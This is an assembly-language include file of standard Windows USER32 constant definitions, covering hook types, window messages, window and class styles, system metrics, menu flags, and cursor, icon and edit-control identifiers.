WH_JOURNALRECORD equ 0
WH_JOURNALPLAYBACK equ 1
WH_KEYBOARD equ 2
WH_GETMESSAGE equ 3
WH_CALLWNDPROC equ 4
WH_CBT equ 5
WH_SYSMSGFILTER equ 6
WH_MOUSE equ 7
WH_HARDWARE equ 8
WH_DEBUG equ 9
WH_SHELL equ 10
WH_FOREGROUNDIDLE equ 11
WH_MAX equ 11
HC_ACTION equ 0
HC_GETNEXT equ 1
HC_SKIP equ 2
HC_NOREMOVE equ 3
HC_NOREM equ HC_NOREMOVE
HC_SYSMODALON equ 4
HC_SYSMODALOFF equ 5
HCBT_MOVESIZE equ 0
HCBT_MINMAX equ 1
HCBT_QS equ 2
HCBT_CREATEWND equ 3
HCBT_DESTROYWND equ 4
HCBT_ACTIVATE equ 5
HCBT_CLICKSKIPPED equ 6
HCBT_KEYSKIPPED equ 7
HCBT_SYSCOMMAND equ 8
HCBT_SETFOCUS equ 9
HSHELL_WINDOWCREATED equ 1
HSHELL_WINDOWDESTROYED equ 2
HSHELL_ACTIVATESHELLWINDOW equ 3
HKL_PREV equ 0
HKL_NEXT equ 1
KLF_ACTIVATE equ 1h
KLF_SUBSTITUTE_OK equ 2h
KLF_UNLOADPREVIOUS equ 4h
KLF_REORDER equ 8h
KL_NAMELENGTH equ 9
DESKTOP_READOBJECTS equ 1h
DESKTOP_CREATEWINDOW equ 2h
DESKTOP_CREATEMENU equ 4h
DESKTOP_HOOKCONTROL equ 8h
DESKTOP_JOURNALRECORD equ 10h
DESKTOP_JOURNALPLAYBACK equ 20h
DESKTOP_ENUMERATE equ 40h
DESKTOP_WRITEOBJECTS equ 80h
WINSTA_ENUMDESKTOPS equ 1h
WINSTA_READATTRIBUTES equ 2h
WINSTA_ACCESSCLIPBOARD equ 4h
WINSTA_CREATEDESKTOP equ 8h
WINSTA_WRITEATTRIBUTES equ 10h
WINSTA_ACCESSPUBLICATOMS equ 20h
WINSTA_EXITWINDOWS equ 40h
WINSTA_ENUMERATE equ 100h
WINSTA_READSCREEN equ 200h
GWL_WNDPROC equ -4
GWL_HINSTANCE equ -6
GWL_HWNDPARENT equ -8
GWL_STYLE equ -16
GWL_EXSTYLE equ -20
GWL_USERDATA equ -21
GWL_ID equ -12
GCL_MENUNAME equ -8
GCL_HBRBACKGROUND equ -10
GCL_HCURSOR equ -12
GCL_HICON equ -14
GCL_HMODULE equ -16
GCL_CBWNDEXTRA equ -18
GCL_CBCLSEXTRA equ -20
GCL_WNDPROC equ -24
GCL_STYLE equ -26
GCW_ATOM equ -32
WM_USER equ 400h
WM_NULL equ 0h
WM_CREATE equ 1h
WM_DESTROY equ 2h
WM_MOVE equ 3h
WM_SIZE equ 5h
WM_ACTIVATE equ 6h
WA_INACTIVE equ 0
WA_ACTIVE equ 1
WA_CLICKACTIVE equ 2
WM_SETFOCUS equ 7h
WM_KILLFOCUS equ 08h
WM_ENABLE equ 0Ah
WM_SETREDRAW equ 0Bh
WM_SETTEXT equ 0Ch
WM_GETTEXT equ 0Dh
WM_GETTEXTLENGTH equ 0Eh
WM_PAINT equ 0Fh
WM_CLOSE equ 10h
WM_QUERYENDSESSION equ 11h
WM_QUIT equ 12h
WM_QUERYOPEN equ 13h
WM_ERASEBKGND equ 14h
WM_SYSCOLORCHANGE equ 15h
WM_ENDSESSION equ 16h
WM_SHOWWINDOW equ 18h
WM_WININICHANGE equ 1Ah
WM_DEVMODECHANGE equ 1Bh
WM_ACTIVATEAPP equ 1Ch
WM_FONTCHANGE equ 1Dh
WM_TIMECHANGE equ 1Eh
WM_CANCELMODE equ 1Fh
WM_SETCURSOR equ 20h
WM_MOUSEACTIVATE equ 21h
WM_CHILDACTIVATE equ 22h
WM_QUEUESYNC equ 23h
WM_GETMINMAXINFO equ 24h
WM_PAINTICON equ 26h
WM_ICONERASEBKGND equ 27h
WM_NEXTDLGCTL equ 28h
WM_SPOOLERSTATUS equ 2Ah
WM_DRAWITEM equ 2Bh
WM_MEASUREITEM equ 2Ch
WM_DELETEITEM equ 2Dh
WM_VKEYTOITEM equ 2Eh
WM_CHARTOITEM equ 2Fh
WM_SETFONT equ 30h
WM_GETFONT equ 31h
WM_SETHOTKEY equ 32h
WM_GETHOTKEY equ 33h
WM_QUERYDRAGICON equ 37h
WM_COMPAREITEM equ 39h
WM_COMPACTING equ 41h
WM_OTHERWINDOWCREATED equ 42h
WM_OTHERWINDOWDESTROYED equ 43h
WM_COMMNOTIFY equ 44h
CN_RECEIVE equ 1h
CN_TRANSMIT equ 2h
CN_EVENT equ 4h
WM_WINDOWPOSCHANGING equ 46h
WM_WINDOWPOSCHANGED equ 47h
WM_POWER equ 48h
PWR_OK equ 1
PWR_FAIL equ -1
PWR_SUSPENDREQUEST equ 1
PWR_SUSPENDRESUME equ 2
PWR_CRITICALRESUME equ 3
WM_COPYDATA equ 4Ah
WM_CANCELJOURNAL equ 4Bh
WM_NOTIFY equ 4Eh
WM_INPUTLANGUAGECHANGEREQUEST equ 50h
WM_INPUTLANGUAGECHANGE equ 51h
WM_TCARD equ 52h
WM_HELP equ 53h
WM_USERCHANGED equ 54h
WM_NOTIFYFORMAT equ 55h
WM_CONTEXTMENU equ 7Bh
WM_STYLECHANGING equ 7Ch
WM_STYLECHANGED equ 7Dh
WM_DISPLAYCHANGE equ 7Eh
WM_GETICON equ 7Fh
WM_SETICON equ 80h
WM_NCCREATE equ 81h
WM_NCDESTROY equ 82h
WM_NCCALCSIZE equ 83h
WM_NCHITTEST equ 84h
WM_NCPAINT equ 85h
WM_NCACTIVATE equ 86h
WM_GETDLGCODE equ 87h
WM_NCMOUSEMOVE equ 0A0h
WM_NCLBUTTONDOWN equ 0A1h
WM_NCLBUTTONUP equ 0A2h
WM_NCLBUTTONDBLCLK equ 0A3h
WM_NCRBUTTONDOWN equ 0A4h
WM_NCRBUTTONUP equ 0A5h
WM_NCRBUTTONDBLCLK equ 0A6h
WM_NCMBUTTONDOWN equ 0A7h
WM_NCMBUTTONUP equ 0A8h
WM_NCMBUTTONDBLCLK equ 0A9h
WM_KEYFIRST equ 100h
WM_KEYDOWN equ 100h
WM_KEYUP equ 101h
WM_CHAR equ 102h
WM_DEADCHAR equ 103h
WM_SYSKEYDOWN equ 104h
WM_SYSKEYUP equ 105h
WM_SYSCHAR equ 106h
WM_SYSDEADCHAR equ 107h
WM_KEYLAST equ 108h
WM_INITDIALOG equ 110h
WM_COMMAND equ 111h
WM_SYSCOMMAND equ 112h
WM_TIMER equ 113h
WM_HSCROLL equ 114h
WM_VSCROLL equ 115h
WM_INITMENU equ 116h
WM_INITMENUPOPUP equ 117h
WM_MENUSELECT equ 11Fh
WM_MENUCHAR equ 120h
WM_ENTERIDLE equ 121h
WM_CTLCOLORMSGBOX equ 132h
WM_CTLCOLOREDIT equ 133h
WM_CTLCOLORLISTBOX equ 134h
WM_CTLCOLORBTN equ 135h
WM_CTLCOLORDLG equ 136h
WM_CTLCOLORSCROLLBAR equ 137h
WM_CTLCOLORSTATIC equ 138h
WM_MOUSEFIRST equ 200h
WM_MOUSEMOVE equ 200h
WM_LBUTTONDOWN equ 201h
WM_LBUTTONUP equ 202h
WM_LBUTTONDBLCLK equ 203h
WM_RBUTTONDOWN equ 204h
WM_RBUTTONUP equ 205h
WM_RBUTTONDBLCLK equ 206h
WM_MBUTTONDOWN equ 207h
WM_MBUTTONUP equ 208h
WM_MBUTTONDBLCLK equ 209h
WM_MOUSELAST equ 209h
WM_PARENTNOTIFY equ 210h
WM_ENTERMENULOOP equ 211h
WM_EXITMENULOOP equ 212h
WM_MDICREATE equ 220h
WM_MDIDESTROY equ 221h
WM_MDIACTIVATE equ 222h
WM_MDIRESTORE equ 223h
WM_MDINEXT equ 224h
WM_MDIMAXIMIZE equ 225h
WM_MDITILE equ 226h
WM_MDICASCADE equ 227h
WM_MDIICONARRANGE equ 228h
WM_MDIGETACTIVE equ 229h
WM_MDISETMENU equ 230h
WM_DROPFILES equ 233h
WM_MDIREFRESHMENU equ 234h
WM_CUT equ 300h
WM_COPY equ 301h
WM_PASTE equ 302h
WM_CLEAR equ 303h
WM_UNDO equ 304h
WM_RENDERFORMAT equ 305h
WM_RENDERALLFORMATS equ 306h
WM_DESTROYCLIPBOARD equ 307h
WM_DRAWCLIPBOARD equ 308h
WM_PAINTCLIPBOARD equ 309h
WM_VSCROLLCLIPBOARD equ 30Ah
WM_SIZECLIPBOARD equ 30Bh
WM_ASKCBFORMATNAME equ 30Ch
WM_CHANGECBCHAIN equ 30Dh
WM_HSCROLLCLIPBOARD equ 30Eh
WM_QUERYNEWPALETTE equ 30Fh
WM_PALETTEISCHANGING equ 310h
WM_PALETTECHANGED equ 311h
WM_HOTKEY equ 312h
WM_PRINTCLIENT equ 318h
WM_PENWINFIRST equ 380h
WM_PENWINLAST equ 38Fh
ST_BEGINSWP equ 0
ST_ENDSWP equ 1
HTERROR equ -2
HTTRANSPARENT equ -1
HTNOWHERE equ 0
HTCLIENT equ 1
HTCAPTION equ 2
HTSYSMENU equ 3
HTGROWBOX equ 4
HTSIZE equ HTGROWBOX
HTMENU equ 5
HTHSCROLL equ 6
HTVSCROLL equ 7
HTMINBUTTON equ 8
HTMAXBUTTON equ 9
HTLEFT equ 10
HTRIGHT equ 11
HTTOP equ 12
HTTOPLEFT equ 13
HTTOPRIGHT equ 14
HTBOTTOM equ 15
HTBOTTOMLEFT equ 16
HTBOTTOMRIGHT equ 17
HTBORDER equ 18
HTREDUCE equ HTMINBUTTON
HTZOOM equ HTMAXBUTTON
HTSIZEFIRST equ HTLEFT
HTSIZELAST equ HTBOTTOMRIGHT
SMTO_NORMAL equ 0h
SMTO_BLOCK equ 1h
SMTO_ABORTIFHUNG equ 2h
MA_ACTIVATE equ 1
MA_ACTIVATEANDEAT equ 2
MA_NOACTIVATE equ 3
MA_NOACTIVATEANDEAT equ 4
SIZE_RESTORED equ 0
SIZE_MINIMIZED equ 1
SIZE_MAXIMIZED equ 2
SIZE_MAXSHOW equ 3
SIZE_MAXHIDE equ 4
SIZENORMAL equ SIZE_RESTORED
SIZEICONIC equ SIZE_MINIMIZED
SIZEFULLSCREEN equ SIZE_MAXIMIZED
SIZEZOOMSHOW equ SIZE_MAXSHOW
SIZEZOOMHIDE equ SIZE_MAXHIDE
WVR_ALIGNTOP equ 10h
WVR_ALIGNLEFT equ 20h
WVR_ALIGNBOTTOM equ 40h
WVR_ALIGNRIGHT equ 80h
WVR_HREDRAW equ 100h
WVR_VREDRAW equ 200h
WVR_REDRAW equ WVR_HREDRAW|WVR_VREDRAW
WVR_VALIDRECTS equ 400h
MK_LBUTTON equ 1h
MK_RBUTTON equ 2h
MK_SHIFT equ 4h
MK_CONTROL equ 8h
MK_MBUTTON equ 10h
WS_OVERLAPPED equ 0h
WS_POPUP equ 80000000h
WS_CHILD equ 40000000h
WS_MINIMIZE equ 20000000h
WS_VISIBLE equ 10000000h
WS_DISABLED equ 8000000h
WS_CLIPSIBLINGS equ 4000000h
WS_CLIPCHILDREN equ 2000000h
WS_MAXIMIZE equ 1000000h
WS_CAPTION equ 0C00000h
WS_BORDER equ 800000h
WS_DLGFRAME equ 400000h
WS_VSCROLL equ 200000h
WS_HSCROLL equ 100000h
WS_SYSMENU equ 80000h
WS_THICKFRAME equ 40000h
WS_GROUP equ 20000h
WS_TABSTOP equ 10000h
WS_MINIMIZEBOX equ 20000h
WS_MAXIMIZEBOX equ 10000h
WS_TILED equ WS_OVERLAPPED
WS_ICONIC equ WS_MINIMIZE
WS_SIZEBOX equ WS_THICKFRAME
WS_OVERLAPPEDWINDOW equ WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_THICKFRAME|WS_MINIMIZEBOX|WS_MAXIMIZEBOX
WS_TILEDWINDOW equ WS_OVERLAPPEDWINDOW
WS_POPUPWINDOW equ WS_POPUP|WS_BORDER|WS_SYSMENU
WS_CHILDWINDOW equ WS_CHILD
WS_EX_DLGMODALFRAME equ 1h
WS_EX_NOPARENTNOTIFY equ 4h
WS_EX_TOPMOST equ 8h
WS_EX_ACCEPTFILES equ 10h
WS_EX_TRANSPARENT equ 20h
WS_EX_MDICHILD equ 00000040h
WS_EX_TOOLWINDOW equ 00000080h
WS_EX_WINDOWEDGE equ 00000100h
WS_EX_CLIENTEDGE equ 00000200h
WS_EX_CONTEXTHELP equ 00000400h
WS_EX_RIGHT equ 00001000h
WS_EX_LEFT equ 00000000h
WS_EX_RTLREADING equ 00002000h
WS_EX_LTRREADING equ 00000000h
WS_EX_LEFTSCROLLBAR equ 00004000h
WS_EX_RIGHTSCROLLBAR equ 00000000h
WS_EX_CONTROLPARENT equ 00010000h
WS_EX_STATICEDGE equ 00020000h
WS_EX_APPWINDOW equ 00040000h
WS_EX_OVERLAPPEDWINDOW equ WS_EX_WINDOWEDGE|WS_EX_CLIENTEDGE
WS_EX_PALETTEWINDOW equ WS_EX_WINDOWEDGE|WS_EX_TOOLWINDOW|WS_EX_TOPMOST
CS_VREDRAW equ 1h
CS_HREDRAW equ 2h
CS_KEYCVTWINDOW equ 4h
CS_DBLCLKS equ 8h
CS_OWNDC equ 20h
CS_CLASSDC equ 40h
CS_PARENTDC equ 80h
CS_NOKEYCVT equ 100h
CS_NOCLOSE equ 200h
CS_SAVEBITS equ 800h
CS_BYTEALIGNCLIENT equ 1000h
CS_BYTEALIGNWINDOW equ 2000h
CS_PUBLICCLASS equ 4000h
CS_GLOBALCLASS equ CS_PUBLICCLASS
CF_TEXT equ 1
CF_BITMAP equ 2
CF_METAFILEPICT equ 3
CF_SYLK equ 4
CF_DIF equ 5
CF_TIFF equ 6
CF_OEMTEXT equ 7
CF_DIB equ 8
CF_PALETTE equ 9
CF_PENDATA equ 10
CF_RIFF equ 11
CF_WAVE equ 12
CF_OWNERDISPLAY equ 80h
CF_DSPTEXT equ 81h
CF_DSPBITMAP equ 82h
CF_DSPMETAFILEPICT equ 83h
CF_DSPENHMETAFILE equ 8Eh
CF_PRIVATEFIRST equ 200h
CF_PRIVATELAST equ 2FFh
CF_GDIOBJFIRST equ 300h
CF_GDIOBJLAST equ 3FFh
FVIRTKEY equ 1h
FNOINVERT equ 2h
FSHIFT equ 4h
FCONTROL equ 8h
FALT equ 10h
WPF_SETMINPOSITION equ 1h
WPF_RESTORETOMAXIMIZED equ 2h
ODT_MENU equ 1
ODT_LISTBOX equ 2
ODT_COMBOBOX equ 3
ODT_BUTTON equ 4
ODA_DRAWENTIRE equ 1h
ODA_SELECT equ 2h
ODA_FOCUS equ 4h
ODS_SELECTED equ 1h
ODS_GRAYED equ 2h
ODS_DISABLED equ 4h
ODS_CHECKED equ 8h
ODS_FOCUS equ 10h
PM_NOREMOVE equ 0h
PM_REMOVE equ 1h
PM_NOYIELD equ 2h
MOD_ALT equ 1h
MOD_CONTROL equ 2h
MOD_SHIFT equ 4h
IDHOT_SNAPWINDOW equ -1
IDHOT_SNAPDESKTOP equ -2
EWX_LOGOFF equ 0
EWX_SHUTDOWN equ 1
EWX_REBOOT equ 2
EWX_FORCE equ 4
EW_RESTARTWINDOWS equ 42h
READAPI equ 0
WRITEAPI equ 1
READ_WRITE equ 2
HWND_BROADCAST equ 0FFFFh
CW_USEDEFAULT equ 80000000h
HWND_DESKTOP equ 0
SWP_NOSIZE equ 1h
SWP_NOMOVE equ 2h
SWP_NOZORDER equ 4h
SWP_NOREDRAW equ 8h
SWP_NOACTIVATE equ 10h
SWP_FRAMECHANGED equ 20h
SWP_SHOWWINDOW equ 40h
SWP_HIDEWINDOW equ 80h
SWP_NOCOPYBITS equ 100h
SWP_NOOWNERZORDER equ 200h
SWP_DRAWFRAME equ SWP_FRAMECHANGED
SWP_NOREPOSITION equ SWP_NOOWNERZORDER
HWND_TOP equ 0
HWND_BOTTOM equ 1
HWND_TOPMOST equ -1
HWND_NOTOPMOST equ -2
DLGWINDOWEXTRA equ 30
KEYEVENTF_EXTENDEDKEY equ 1h
KEYEVENTF_KEYUP equ 2h
MOUSEEVENTF_MOVE equ 1h
MOUSEEVENTF_LEFTDOWN equ 2h
MOUSEEVENTF_LEFTUP equ 4h
MOUSEEVENTF_RIGHTDOWN equ 8h
MOUSEEVENTF_RIGHTUP equ 10h
MOUSEEVENTF_MIDDLEDOWN equ 20h
MOUSEEVENTF_MIDDLEUP equ 40h
MOUSEEVENTF_ABSOLUTE equ 8000h
QS_KEY equ 1h
QS_MOUSEMOVE equ 2h
QS_MOUSEBUTTON equ 4h
QS_POSTMESSAGE equ 8h
QS_TIMER equ 10h
QS_PAINT equ 20h
QS_SENDMESSAGE equ 40h
QS_HOTKEY equ 80h
QS_MOUSE equ QS_MOUSEMOVE|QS_MOUSEBUTTON
QS_INPUT equ QS_MOUSE|QS_KEY
QS_ALLEVENTS equ QS_INPUT|QS_POSTMESSAGE|QS_TIMER|QS_PAINT|QS_HOTKEY
QS_ALLINPUT equ QS_SENDMESSAGE|QS_PAINT|QS_TIMER|QS_POSTMESSAGE|QS_MOUSEBUTTON|QS_MOUSEMOVE|QS_HOTKEY|QS_KEY
SM_CXSCREEN equ 0
SM_CYSCREEN equ 1
SM_CXVSCROLL equ 2
SM_CYHSCROLL equ 3
SM_CYCAPTION equ 4
SM_CXBORDER equ 5
SM_CYBORDER equ 6
SM_CXDLGFRAME equ 7
SM_CYDLGFRAME equ 8
SM_CYVTHUMB equ 9
SM_CXHTHUMB equ 10
SM_CXICON equ 11
SM_CYICON equ 12
SM_CXCURSOR equ 13
SM_CYCURSOR equ 14
SM_CYMENU equ 15
SM_CXFULLSCREEN equ 16
SM_CYFULLSCREEN equ 17
SM_CYKANJIWINDOW equ 18
SM_MOUSEPRESENT equ 19
SM_CYVSCROLL equ 20
SM_CXHSCROLL equ 21
SM_DEBUG equ 22
SM_SWAPBUTTON equ 23
SM_RESERVED1 equ 24
SM_RESERVED2 equ 25
SM_RESERVED3 equ 26
SM_RESERVED4 equ 27
SM_CXMIN equ 28
SM_CYMIN equ 29
SM_CXSIZE equ 30
SM_CYSIZE equ 31
SM_CXFRAME equ 32
SM_CYFRAME equ 33
SM_CXMINTRACK equ 34
SM_CYMINTRACK equ 35
SM_CXDOUBLECLK equ 36
SM_CYDOUBLECLK equ 37
SM_CXICONSPACING equ 38
SM_CYICONSPACING equ 39
SM_MENUDROPALIGNMENT equ 40
SM_PENWINDOWS equ 41
SM_DBCSENABLED equ 42
SM_CMOUSEBUTTONS equ 43
SM_CXFIXEDFRAME equ SM_CXDLGFRAME
SM_CYFIXEDFRAME equ SM_CYDLGFRAME
SM_CXSIZEFRAME equ SM_CXFRAME
SM_CYSIZEFRAME equ SM_CYFRAME
SM_SECURE equ 44
SM_CXEDGE equ 45
SM_CYEDGE equ 46
SM_CXMINSPACING equ 47
SM_CYMINSPACING equ 48
SM_CXSMICON equ 49
SM_CYSMICON equ 50
SM_CYSMCAPTION equ 51
SM_CXSMSIZE equ 52
SM_CYSMSIZE equ 53
SM_CXMENUSIZE equ 54
SM_CYMENUSIZE equ 55
SM_ARRANGE equ 56
SM_CXMINIMIZED equ 57
SM_CYMINIMIZED equ 58
SM_CXMAXTRACK equ 59
SM_CYMAXTRACK equ 60
SM_CXMAXIMIZED equ 61
SM_CYMAXIMIZED equ 62
SM_NETWORK equ 63
SM_CLEANBOOT equ 67
SM_CXDRAG equ 68
SM_CYDRAG equ 69
SM_SHOWSOUNDS equ 70
SM_CXMENUCHECK equ 71
SM_CYMENUCHECK equ 72
SM_SLOWMACHINE equ 73
SM_MIDEASTENABLED equ 74
SM_CMETRICS equ 75
TPM_LEFTBUTTON equ 0h
TPM_RIGHTBUTTON equ 2h
TPM_LEFTALIGN equ 0h
TPM_CENTERALIGN equ 4h
TPM_RIGHTALIGN equ 8h
DT_TOP equ 0h
DT_LEFT equ 0h
DT_CENTER equ 1h
DT_RIGHT equ 2h
DT_VCENTER equ 4h
DT_BOTTOM equ 8h
DT_WORDBREAK equ 10h
DT_SINGLELINE equ 20h
DT_EXPANDTABS equ 40h
DT_TABSTOP equ 80h
DT_NOCLIP equ 100h
DT_EXTERNALLEADING equ 200h
DT_CALCRECT equ 400h
DT_NOPREFIX equ 800h
DT_INTERNAL equ 1000h
DCX_WINDOW equ 1h
DCX_CACHE equ 2h
DCX_NORESETATTRS equ 4h
DCX_CLIPCHILDREN equ 8h
DCX_CLIPSIBLINGS equ 10h
DCX_PARENTCLIP equ 20h
DCX_EXCLUDERGN equ 40h
DCX_INTERSECTRGN equ 80h
DCX_EXCLUDEUPDATE equ 100h
DCX_INTERSECTUPDATE equ 200h
DCX_LOCKWINDOWUPDATE equ 400h
DCX_NORECOMPUTE equ 100000h
DCX_VALIDATE equ 200000h
RDW_INVALIDATE equ 1h
RDW_INTERNALPAINT equ 2h
RDW_ERASE equ 4h
RDW_VALIDATE equ 8h
RDW_NOINTERNALPAINT equ 10h
RDW_NOERASE equ 20h
RDW_NOCHILDREN equ 40h
RDW_ALLCHILDREN equ 80h
RDW_UPDATENOW equ 100h
RDW_ERASENOW equ 200h
RDW_FRAME equ 400h
RDW_NOFRAME equ 800h
SW_SCROLLCHILDREN equ 1h
SW_INVALIDATE equ 2h
SW_ERASE equ 4h
ESB_ENABLE_BOTH equ 0h
ESB_DISABLE_BOTH equ 3h
ESB_DISABLE_LEFT equ 1h
ESB_DISABLE_RIGHT equ 2h
ESB_DISABLE_UP equ 1h
ESB_DISABLE_DOWN equ 2h
ESB_DISABLE_LTUP equ ESB_DISABLE_LEFT
ESB_DISABLE_RTDN equ ESB_DISABLE_RIGHT
MB_OK equ 0h
MB_OKCANCEL equ 1h
MB_ABORTRETRYIGNORE equ 2h
MB_YESNOCANCEL equ 3h
MB_YESNO equ 4h
MB_RETRYCANCEL equ 5h
MB_ICONHAND equ 10h
MB_ICONQUESTION equ 20h
MB_ICONEXCLAMATION equ 30h
MB_ICONASTERISK equ 40h
MB_ICONERROR equ MB_ICONHAND
MB_ICONINFORMATION equ MB_ICONASTERISK
MB_ICONSTOP equ MB_ICONHAND
MB_ICONWARNING equ MB_ICONEXCLAMATION
MB_DEFBUTTON1 equ 0h
MB_DEFBUTTON2 equ 100h
MB_DEFBUTTON3 equ 200h
MB_APPLMODAL equ 0h
MB_SYSTEMMODAL equ 1000h
MB_TASKMODAL equ 2000h
MB_NOFOCUS equ 8000h
MB_SETFOREGROUND equ 10000h
MB_DEFAULT_DESKTOP_ONLY equ 20000h
MB_TYPEMASK equ 0Fh
MB_ICONMASK equ 0F0h
MB_DEFMASK equ 0F00h
MB_MODEMASK equ 3000h
MB_MISCMASK equ 0C000h
CTLCOLOR_MSGBOX equ 0
CTLCOLOR_EDIT equ 1
CTLCOLOR_LISTBOX equ 2
CTLCOLOR_BTN equ 3
CTLCOLOR_DLG equ 4
CTLCOLOR_SCROLLBAR equ 5
CTLCOLOR_STATIC equ 6
CTLCOLOR_MAX equ 8
COLOR_SCROLLBAR equ 0
COLOR_BACKGROUND equ 1
COLOR_ACTIVECAPTION equ 2
COLOR_INACTIVECAPTION equ 3
COLOR_MENU equ 4
COLOR_WINDOW equ 5
COLOR_WINDOWFRAME equ 6
COLOR_MENUTEXT equ 7
COLOR_WINDOWTEXT equ 8
COLOR_CAPTIONTEXT equ 9
COLOR_ACTIVEBORDER equ 10
COLOR_INACTIVEBORDER equ 11
COLOR_APPWORKSPACE equ 12
COLOR_HIGHLIGHT equ 13
COLOR_HIGHLIGHTTEXT equ 14
COLOR_BTNFACE equ 15
COLOR_BTNSHADOW equ 16
COLOR_GRAYTEXT equ 17
COLOR_BTNTEXT equ 18
COLOR_INACTIVECAPTIONTEXT equ 19
COLOR_BTNHIGHLIGHT equ 20
COLOR_3DDKSHADOW equ 21
COLOR_3DLIGHT equ 22
COLOR_INFOTEXT equ 23
COLOR_INFOBK equ 24
COLOR_DESKTOP equ COLOR_BACKGROUND
COLOR_3DFACE equ COLOR_BTNFACE
COLOR_3DSHADOW equ COLOR_BTNSHADOW
COLOR_3DHIGHLIGHT equ COLOR_BTNHIGHLIGHT
COLOR_3DHILIGHT equ COLOR_BTNHIGHLIGHT
COLOR_BTNHILIGHT equ COLOR_BTNHIGHLIGHT
GW_HWNDFIRST equ 0
GW_HWNDLAST equ 1
GW_HWNDNEXT equ 2
GW_HWNDPREV equ 3
GW_OWNER equ 4
GW_CHILD equ 5
GW_MAX equ 5
MF_INSERT equ 0h
MF_CHANGE equ 80h
MF_APPEND equ 100h
MF_DELETE equ 200h
MF_REMOVE equ 1000h
MF_BYCOMMAND equ 0h
MF_BYPOSITION equ 400h
MF_SEPARATOR equ 800h
MF_ENABLED equ 0h
MF_GRAYED equ 1h
MF_DISABLED equ 2h
MF_UNCHECKED equ 0h
MF_CHECKED equ 8h
MF_USECHECKBITMAPS equ 200h
MF_STRING equ 0h
MF_BITMAP equ 4h
MF_OWNERDRAW equ 100h
MF_POPUP equ 10h
MF_MENUBARBREAK equ 20h
MF_MENUBREAK equ 40h
MF_UNHILITE equ 0h
MF_HILITE equ 80h
MF_SYSMENU equ 2000h
MF_HELP equ 4000h
MF_MOUSESELECT equ 8000h
MF_END equ 80h
SC_SIZE equ 0F000h
SC_MOVE equ 0F010h
SC_MINIMIZE equ 0F020h
SC_MAXIMIZE equ 0F030h
SC_NEXTWINDOW equ 0F040h
SC_PREVWINDOW equ 0F050h
SC_CLOSE equ 0F060h
SC_VSCROLL equ 0F070h
SC_HSCROLL equ 0F080h
SC_MOUSEMENU equ 0F090h
SC_KEYMENU equ 0F100h
SC_ARRANGE equ 0F110h
SC_RESTORE equ 0F120h
SC_TASKLIST equ 0F130h
SC_SCREENSAVE equ 0F140h
SC_HOTKEY equ 0F150h
SC_ICON equ SC_MINIMIZE
SC_ZOOM equ SC_MAXIMIZE
IDC_ARROW equ 32512
IDC_IBEAM equ 32513
IDC_WAIT equ 32514
IDC_CROSS equ 32515
IDC_UPARROW equ 32516
IDC_SIZE equ 32640
IDC_ICON equ 32641
IDC_SIZENWSE equ 32642
IDC_SIZENESW equ 32643
IDC_SIZEWE equ 32644
IDC_SIZENS equ 32645
IDC_SIZEALL equ 32646
IDC_NO equ 32648
IDC_APPSTARTING equ 32650
OBM_CLOSE equ 32754
OBM_UPARROW equ 32753
OBM_DNARROW equ 32752
OBM_RGARROW equ 32751
OBM_LFARROW equ 32750
OBM_REDUCE equ 32749
OBM_ZOOM equ 32748
OBM_RESTORE equ 32747
OBM_REDUCED equ 32746
OBM_ZOOMD equ 32745
OBM_RESTORED equ 32744
OBM_UPARROWD equ 32743
OBM_DNARROWD equ 32742
OBM_RGARROWD equ 32741
OBM_LFARROWD equ 32740
OBM_MNARROW equ 32739
OBM_COMBO equ 32738
OBM_UPARROWI equ 32737
OBM_DNARROWI equ 32736
OBM_RGARROWI equ 32735
OBM_LFARROWI equ 32734
OBM_OLD_CLOSE equ 32767
OBM_SIZE equ 32766
OBM_OLD_UPARROW equ 32765
OBM_OLD_DNARROW equ 32764
OBM_OLD_RGARROW equ 32763
OBM_OLD_LFARROW equ 32762
OBM_BTSIZE equ 32761
OBM_CHECK equ 32760
OBM_CHECKBOXES equ 32759
OBM_BTNCORNERS equ 32758
OBM_OLD_REDUCE equ 32757
OBM_OLD_ZOOM equ 32756
OBM_OLD_RESTORE equ 32755
OCR_NORMAL equ 32512
OCR_IBEAM equ 32513
OCR_WAIT equ 32514
OCR_CROSS equ 32515
OCR_UP equ 32516
OCR_SIZE equ 32640
OCR_ICON equ 32641
OCR_SIZENWSE equ 32642
OCR_SIZENESW equ 32643
OCR_SIZEWE equ 32644
OCR_SIZENS equ 32645
OCR_SIZEALL equ 32646
OCR_ICOCUR equ 32647
OCR_NO equ 32648
OIC_SAMPLE equ 32512
OIC_HAND equ 32513
OIC_QUES equ 32514
OIC_BANG equ 32515
OIC_NOTE equ 32516
ORD_LANGDRIVER equ 1
IDI_APPLICATION equ 32512
IDI_HAND equ 32513
IDI_QUESTION equ 32514
IDI_EXCLAMATION equ 32515
IDI_ASTERISK equ 32516
IDOK equ 1
IDCANCEL equ 2
IDABORT equ 3
IDRETRY equ 4
IDIGNORE equ 5
IDYES equ 6
IDNO equ 7
ES_LEFT equ 0h
ES_CENTER equ 1h
ES_RIGHT equ 2h
ES_MULTILINE equ 4h
ES_UPPERCASE equ 8h
ES_LOWERCASE equ 10h
ES_PASSWORD equ 20h
ES_AUTOVSCROLL equ 40h
ES_AUTOHSCROLL equ 80h
ES_NOHIDESEL equ 100h
ES_OEMCONVERT equ 400h
ES_READONLY equ 800h
ES_WANTRETURN equ 1000h
EN_SETFOCUS equ 100h
EN_KILLFOCUS equ 200h
EN_CHANGE equ 300h
EN_UPDATE equ 400h
EN_ERRSPACE equ 500h
EN_MAXTEXT equ 501h
EN_HSCROLL equ 601h
EN_VSCROLL equ 602h
EM_GETSEL equ 0B0h
EM_SETSEL equ 0B1h
EM_GETRECT equ 0B2h
EM_SETRECT equ 0B3h
EM_SETRECTNP equ 0B4h
EM_SCROLL equ 0B5h
EM_LINESCROLL equ 0B6h
EM_SCROLLCARET equ 0B7h
EM_GETMODIFY equ 0B8h
EM_SETMODIFY equ 0B9h
EM_GETLINECOUNT equ 0BAh
EM_LINEINDEX equ 0BBh
EM_SETHANDLE equ 0BCh
EM_GETHANDLE equ 0BDh
EM_GETTHUMB equ 0BEh
EM_LINELENGTH equ 0C1h
EM_REPLACESEL equ 0C2h
EM_GETLINE equ 0C4h
EM_LIMITTEXT equ 0C5h
EM_CANUNDO equ 0C6h
EM_UNDO equ 0C7h
EM_FMTLINES equ 0C8h
EM_LINEFROMCHAR equ 0C9h
EM_SETTABSTOPS equ 0CBh
EM_SETPASSWORDCHAR equ 0CCh
EM_EMPTYUNDOBUFFER equ 0CDh
EM_GETFIRSTVISIBLELINE equ 0CEh
